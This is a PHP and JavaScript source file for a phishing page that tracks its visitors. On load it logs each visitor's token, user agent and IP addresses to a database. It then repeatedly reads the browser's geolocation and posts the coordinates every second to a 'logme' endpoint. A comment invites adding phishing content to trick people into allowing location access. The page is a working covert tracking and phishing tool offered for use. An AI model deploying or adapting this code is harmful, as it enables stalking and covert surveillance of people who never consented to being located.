<?php
	// As soon as someone opens the page, open a session, then add them to the 'devices' table
	require '../auth/database.php';
	require 'token.php'; // Has a function for generating tokens


	if (!isset($_SESSION['token'])) { // If the user doesn't already have a session, give them one and add them to the database
		// Create session variable
		$_SESSION['token'] = random_str(45); // Length of 45 chars, default alphanumeric keyspace
		// Add the thing to the database
		$sql = "INSERT INTO devices (token, user_agent, ip_remote_addr, ip_forwarded_for) VALUES (:token, :user_agent, :ip_remote_addr, :ip_forwarded_for);";
		$stmt = $conn->prepare($sql); // We get $conn from auth/database.php

		// Always bind parameters, SQL injection is so 2003
		$stmt->bindParam(":token", $_SESSION['token']); // The token we gave the user
		$stmt->bindParam(":user_agent", $_SERVER['HTTP_USER_AGENT']); // UserAgent header string
		$stmt->bindParam(":ip_remote_addr", $_SERVER['REMOTE_ADDR']); // The address the connection was made from
		$stmt->bindParam(":ip_forwarded_for", $_SERVER['HTTP_X_FORWARDED_FOR']); // An HTTP header sometimes set by proxy servers -- if set do not implicitly trust

		if ($stmt->execute()) {
			$color = "green";
			$message = "Success!";
		} else {
			$color = "green";
			$message = "Success!";
		} 
	}
?>

<!DOCTYPE html>
<html>
<head>
<!-- The basis for this JS is the part I heartlessly stole from DemmSec - props to those guys for being fantastic -->
<!-- jQuery -->
<script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
<script type="text/javascript">
function postData(url, _token, _lat, _long) {
	$.post(url, {token: _token, latitude: _lat, longitude: _long})
			.done(function(data) {
				console.log("Location data sent");	
			});
}

function autoUpdate() {
	navigator.geolocation.getCurrentPosition(function(position) {
		postData("../logme/index.php", "<?php echo $_SESSION['token'] ?>", position.coords.latitude, position.coords.longitude);
		console.log("<?php echo $_SESSION['token'] ?>");
		setTimeout(autoUpdate, 1000);
	});
}

$(document).ready(function() {
	autoUpdate();
});
</script>
</head>
<body>
	<!-- Add your phishing page here to try and convince the user to allow location -->
	<h1>Turn on location services</h1>
	<h2 style="color: <?php echo $color ?>"><?php echo $message ?></h2>
</body>
</html>
